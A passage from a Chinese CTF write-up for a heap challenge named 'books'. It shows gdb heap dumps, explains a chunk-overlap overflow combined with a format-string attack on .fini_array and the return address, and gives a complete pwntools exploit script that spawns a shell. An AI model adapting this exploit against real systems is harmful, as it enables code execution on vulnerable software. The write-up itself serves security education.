    0x1b8d290:  0x0000000000000000  0x0000000000000000
    0x1b8d2a0:  0x0000000000000000  0x0000000000000000
    0x1b8d2b0:  0x0000000000000000  0x0000000000000000
    0x1b8d2c0:  0x0000000000000000  0x0000000000000000
    0x1b8d2d0:  0x0000000000000000  0x0000000000000000
    0x1b8d2e0:  0x0000000000000000  0x0000000000000000
    0x1b8d2f0:  0x0000000000000000  0x0000000000000000
    0x1b8d300:  0x0000000000000000  0x0000000000000000
    0x1b8d310:  0x0000000000000000  0x0000000000000000
  1. 编辑第一块堆块内容，溢出到第二块的size，修改第二块的size为0x150，为什么是0x150?(因为你看程序在合并的时候有个malloc(0x140)，这样合并的时候申请的堆块就会跑到这上面来，也就是说我们第二块堆块跟第三块堆块这时候会重合
        gdb-peda$ x/50gx 0x1695028-0x28
    0x1695000:  0x0000000000000000  0x0000000000000091
    0x1695010:  0x3125633731363225  0x313325516e682433
    0x1695020:  0x7024383225507024  0x6161616161616161
    0x1695030:  0x6161616161616161  0x6161616161616161
    0x1695040:  0x6161616161616161  0x6161616161616161
    0x1695050:  0x6161616161616161  0x6161616161616161
    0x1695060:  0x6161616161616161  0x6161616161616161
    0x1695070:  0x6161616161616161  0x6161616161616161
    0x1695080:  0x0000000061616161  0x0000000000000000
    0x1695090:  0x0000000000000000  0x0000000000000151
    0x16950a0:  0x00007f0e99412b00  0x00007f0e99412b78
    0x16950b0:  0x0000000000000000  0x0000000000000000
    0x16950c0:  0x0000000000000000  0x0000000000000000
    0x16950d0:  0x0000000000000000  0x0000000000000000
    0x16950e0:  0x0000000000000000  0x0000000000000000
    0x16950f0:  0x0000000000000000  0x0000000000000000
    0x1695100:  0x0000000000000000  0x0000000000000000
    0x1695110:  0x0000000000000000  0x0000000000000000
    0x1695120:  0x0000000000000090  0x0000000000000090
    0x1695130:  0x64726f2072756f59  0x7573207369207265
    0x1695140:  0x2164657474696d62  0x000000000000000a
    0x1695150:  0x0000000000000000  0x0000000000000000
    0x1695160:  0x0000000000000000  0x0000000000000000
    0x1695170:  0x0000000000000000  0x0000000000000000
    0x1695180:  0x0000000000000000  0x0000000000000000
  2. 然后submit的时候具体会变成什么样呢?，会先复制 **Order 1:** ，然后在复制chunk1里的内容，在复制chunk2里的内容，注意注意chunk2的内容现在是什么，是前面的 **Order 1:** 在加上chunk1的内容，因为堆块2的指针还指向chunk2的数据部分，所以会复制两次
  3. 就是 **Order 1:** +chunk1+'\n'+ **Order 2:** + **Order 1:** +chun1+'\n'
  4. 如果我们要利用格式化字符串的洞的话，要精确复制到堆块3的size部分后就停止，到这部分大小是0x90
  5. 也就是说我们 **Order 1:** +chunk1+'\n'+ **Order 2:** + **Order 1:** 这个的大小要为0x90，求出chunk大小，0x90-9*3-1=0x88-0x1c=0x74
  6. 所以我们可以在前面0x74里写格式化字符串的利用，后面就利用得上了
这是合并后的结果
    gdb-peda$ x/56gx 0x6e6028-0x28
    0x6e6000:   0x0000000000000000  0x0000000000000091
    0x6e6010:   0x3125633731363225  0x313325516e682433
    0x6e6020:   0x7024383225507024  0x6161616161616161
    0x6e6030:   0x6161616161616161  0x6161616161616161
    0x6e6040:   0x6161616161616161  0x6161616161616161
    0x6e6050:   0x6161616161616161  0x6161616161616161
    0x6e6060:   0x6161616161616161  0x6161616161616161
    0x6e6070:   0x6161616161616161  0x6161616161616161
    0x6e6080:   0x0000000061616161  0x0000000000000000
    0x6e6090:   0x0000000000000000  0x0000000000000151
    0x6e60a0:   0x3a3120726564724f  0x2563373136322520
    0x6e60b0:   0x3325516e68243331  0x2438322550702431
    0x6e60c0:   0x6161616161616170  0x6161616161616161
    0x6e60d0:   0x6161616161616161  0x6161616161616161
    0x6e60e0:   0x6161616161616161  0x6161616161616161
    0x6e60f0:   0x6161616161616161  0x6161616161616161
    0x6e6100:   0x6161616161616161  0x6161616161616161
    0x6e6110:   0x6161616161616161  0x724f0a6161616161
    0x6e6120:   0x4f203a3220726564  0x203a312072656472
    0x6e6130:   0x3125633731363225  0x313325516e682433
    0x6e6140:   0x7024383225507024  0x6161616161616161
    0x6e6150:   0x6161616161616161  0x6161616161616161
    0x6e6160:   0x6161616161616161  0x6161616161616161
    0x6e6170:   0x6161616161616161  0x6161616161616161
    0x6e6180:   0x6161616161616161  0x6161616161616161
    0x6e6190:   0x6161616161616161  0x6161616161616161
    0x6e61a0:   0x64724f0a61616161  0x000a203a32207265
    0x6e61b0:   0x0000000000000000  0x0000000000000411
  1. 既然是堆题我就不再讲格式化字符串利用了，后面先利用格式化字符串修改.fini的地址，这样能多返回一次到main函数，同时泄露libc函数地址，为什么修改.fini里的地址能多返回一次main函数呢，请看
[linux_x86程序启动中文版](https://luomuxiaoxiao.com/?p=516)  
[linux_x86程序启动英文版](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)  
这两篇文章一样的，不过一个中文版，一个英文版，建议英文好的同学读原版，因为.fini在exit前会进行调用，所以修改后能执行多一次main函数
  1. 这时候发觉泄露出libc后不知道修改哪个函数了，因为调用printf后再也没函数用了，这时候思路又断了
  2. 所以这时候想想别的办法，发觉栈上存了一个与存main函数返回地址的指针存在一定偏移的地址，所以泄露出来后，在减掉那个固定偏移就可以修改main函数返回地址了
注意：这里格式化字符串内容存在堆里，指针存在栈上，所以我们fgets输入的才是对应上的偏移
### 1.2.4. exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'books'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'books'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        p = ctx.start()
        libc = ELF(libc)
    else:
        p = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    No RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    def edit(idx, content) :
        p.sendline(str(idx))
        p.recvregex(r'''Enter (.*?) order:\n''')
        p.sendline(content)
    def delete(idx) :
        p.sendline(str(idx+2))
    def submit(content) :
        p.sendline('5'+ '\x00'*7 + content)
    def exp():
        fini_array = 0x6011B8
        main_addr = 0x400A39
        delete(2)
        #first step 
        #leak
        fmstr = "%{}c%{}$hnQ%{}$pP%{}$p".format(0xA39, 13, 31, 28)
        payload = fmstr.ljust(0x74, 'a')
        payload = payload.ljust(0x88, '\x00')
        payload += p64(0x151)
        edit(1, payload)
        #offset=13
        gdb.attach(p)
        submit(p64(fini_array))
        for _ in range(3):
            p.recvuntil('Q')
        __libc_start_main_addr = int(p.recv(14), 16)
        libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']-240
        ret_addr = int(p.recv(15)[1:], 16)-0x1e8
        one_gadget_offset = 0x45216 
        #one_gadget_offset = 0x4526a 
        #one_gadget_offset = 0xf02a4
        #one_gadget_offset = 0xf1147
        one_gadget = libc_base + one_gadget_offset
        p.success("libc_base-> 0x%x" % libc_base)
        p.success("ret_addr-> 0x%x" % ret_addr)
        p.success("one_gadget-> 0x%x" % one_gadget)
        #second step
        delete(2)
        part1 = ((one_gadget>>16)& 0xffff)
        part2 = (one_gadget & 0xffff)
        part =[
            (part1, p64(ret_addr+2)),
            (part2, p64(ret_addr))
        ]
        part.sort(key=lambda tup: tup[0])
        size = [i[0] for i in part]
        addr =''.join(x[1] for x in part)
        print(size)
        print(addr)
        fmstr = "%{}c%{}$hn".format(size[0], 13)
        fmstr += "%{}c%{}$hn".format(size[1]-size[0], 14)
        payload = fmstr.ljust(0x74, 'a')
        payload = payload.ljust(0x88, '\x00')
        payload += p64(0x151)
        edit(1, payload)
        #offset=13
        submit(addr)
        #gdb.attach(p)
    if __name__ == '__main__':
        exp()
        p.interactive()
## 1.3. 总结
  1. 这道题堆部分难点部分想到了就不难，没想到就难，就是要利用那个部分溢出到第三个堆块
  2. 其余部分就全是格式化字符串的利用了，没什么好讲的
  3. 这道题拿到shell也偏废时间，最主要直接看exp我看不懂，后面去看文章才看懂的
## 1.4. 参考链接
[看雪大佬的文章](https://bbs.pediy.com/thread-246783.htm)